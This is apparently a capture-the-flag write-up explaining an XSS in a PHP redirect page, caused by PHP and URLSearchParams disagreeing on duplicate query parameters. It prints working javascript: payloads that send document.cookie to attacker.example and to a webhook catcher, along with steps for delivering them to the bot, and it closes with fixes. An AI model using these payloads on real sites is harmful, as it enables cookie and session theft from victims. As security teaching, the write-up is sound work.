# Parse and Parse — Writeup

## Challenge summary

This challenge is a classic **query-string parser differential** leading to client-side XSS.

The vulnerable PHP page validates a `redirectUri` parameter very strictly, but then the browser-side JavaScript parses the query string again with a **different parser**. By sending **two parameters with the same name**, we can make the server validate one value while the browser uses another.

That lets us execute JavaScript in the bot's origin and exfiltrate the flag cookie.

---

## Relevant vulnerable code

```php
<?php
header("Content-Security-Policy: default-src 'none'; script-src 'unsafe-inline'; frame-src 'none'; object-src 'none'; base-uri 'none';");
header("X-Content-Type-Options: nosniff");
header("X-Frame-Options: DENY");

$redirectUri = $_GET['redirectUri'];
if (!isset($redirectUri) || empty($redirectUri)) {
    die('Missing redirect_uri parameter');
}
if (gettype($redirectUri) !== 'string') {
    die('redirect_uri parameter must be a string');
}
if (!filter_var($redirectUri, FILTER_VALIDATE_URL)) {
    die('redirect_uri parameter must be a valid URL');
}
if ($redirectUri !== 'http://example.com/') {
    die('redirect_uri parameter must be http://example.com/');
}

echo '<script>location = new URLSearchParams(window.location.search).get("redirectUri");</script>';
```

The important line is:

```js
location = new URLSearchParams(window.location.search).get("redirectUri");
```

---

## Root cause

Two different parsers process the query string:

1. **PHP** parses the query string into `$_GET`
2. **JavaScript** parses the raw query string again using `URLSearchParams`

These two parsers disagree when the same parameter appears more than once.

### Server-side behavior

PHP treats duplicate scalar parameters like this:

```text
?redirectUri=A&redirectUri=B
```

and effectively keeps the **last** value for `$_GET['redirectUri']`.

So the server validates:

```text
redirectUri = http://example.com/
```

if that is the last occurrence.

### Client-side behavior

`URLSearchParams.get("redirectUri")` returns the **first** matching value.

So in the browser:

```text
?redirectUri=javascript:alert(1)&redirectUri=http://example.com/
```

becomes:

- PHP sees: `http://example.com/`
- JavaScript sees: `javascript:alert(1)`

That is the entire bug.

---

## Why the validation does not help

All of the checks only apply to the value PHP sees:

- `isset(...)`
- `empty(...)`
- `gettype(...) === 'string'`
- `FILTER_VALIDATE_URL`
- exact match against `http://example.com/`

Because PHP only keeps the last duplicate parameter, those checks are performed on:

```text
http://example.com/
```

not on the first attacker-controlled value that the browser later uses.

---

## XSS primitive

A minimal proof of concept is:

```text
/?redirectUri=javascript:alert(document.domain)&redirectUri=http://example.com/
```

What happens:

1. PHP validates the **last** `redirectUri`
2. The page is rendered
3. Inline JavaScript runs
4. `URLSearchParams.get("redirectUri")` returns the **first** `redirectUri`
5. `location = "javascript:..."` navigates to a `javascript:` URL
6. The JavaScript executes

The page CSP even allows inline scripts with:

```text
script-src 'unsafe-inline'
```

so the sink is reachable.

---

## Bot behavior

The bot logic is what turns the XSS into flag exfiltration.

The important details are:

- the bot sets a cookie named `flag`
- the cookie is **not** `HttpOnly`
- the cookie domain is `web`
- the bot only accepts URLs matching `http://web:8080/...`
- after visiting, it waits a few seconds

So the intended exploitation path is:

1. submit a URL to the report bot
2. the bot visits `http://web:8080/...`
3. the XSS runs in the `web` origin
4. `document.cookie` contains the flag
5. exfiltrate it to an attacker-controlled server

This is why directly opening the public challenge domain yourself only gives an empty cookie: the flag is set for the bot's internal origin, not your browser's public origin.

---

## Final exploit idea

We use two `redirectUri` parameters:

- first one for the browser: `javascript:...`
- second one for PHP: `http://example.com/`

Example payload structure:

```text
http://web:8080/?redirectUri=javascript:location='https://attacker.example/?c='+encodeURIComponent(document.cookie)&redirectUri=http://example.com/
```

URL-encoded version:

```text
http://web:8080/?redirectUri=javascript%3Alocation%3D%27https%3A%2F%2Fattacker.example%2F%3Fc%3D%27%2BencodeURIComponent%28document.cookie%29&redirectUri=http%3A%2F%2Fexample.com%2F
```

Then submit that URL to the bot.

---

## Real exploitation flow

### Step 1: host a webhook

Use any request catcher such as:

```text
https://webhook.site/...
```

### Step 2: craft the internal bot URL

Example:

```text
http://web:8080/?redirectUri=javascript%3Alocation%3D%27https%3A%2F%2Fwebhook.site%2FYOUR-ID%3Fc%3D%27%2BencodeURIComponent%28document.cookie%29&redirectUri=http%3A%2F%2Fexample.com%2F
```

### Step 3: submit it to the report endpoint

Do **not** submit the public challenge URL as the final target for execution.

You must submit the **internal URL** that the bot is allowed to visit:

```text
http://web:8080/?redirectUri=...
```

### Step 4: receive the flag

When the bot opens the page:

- PHP validates the last `redirectUri`
- the page JavaScript uses the first `redirectUri`
- the `javascript:` URL runs in the bot's origin
- `document.cookie` contains the flag
- the browser navigates to your webhook with the cookie in `?c=`

---

## Why this challenge is interesting

This is not a normal reflected XSS caused by missing escaping.

The server-side code looks strict and even checks for:

- valid URL
- exact allowed value
- correct type

But the bug is still exploitable because the application **parses attacker input twice with different semantics**.

This is the core lesson:

> Input validation is not enough if the validated data is later reparsed by a different component with different rules.

---

## Fix

There are multiple safe fixes.

### Best fix

Do not reparse raw attacker-controlled query parameters in the browser.

Instead, only use the already validated server-side value, for example by embedding the validated value directly into the page.

### Additional fixes

- reject duplicate query parameters
- do not allow `javascript:` as a navigation target
- avoid assigning untrusted data directly to `location`
- use an allowlist and compare the fully parsed origin/URL components instead of raw strings

---

## Final takeaway

The solve is based on a **first-vs-last duplicate parameter differential**:

- **PHP** validates the **last** `redirectUri`
- **`URLSearchParams.get()`** returns the **first** `redirectUri`

That discrepancy lets us pass validation with:

```text
redirectUri=http://example.com/
```

while actually executing:

```text
redirectUri=javascript:...
```

Once that is combined with the bot's readable flag cookie, the challenge is solved.
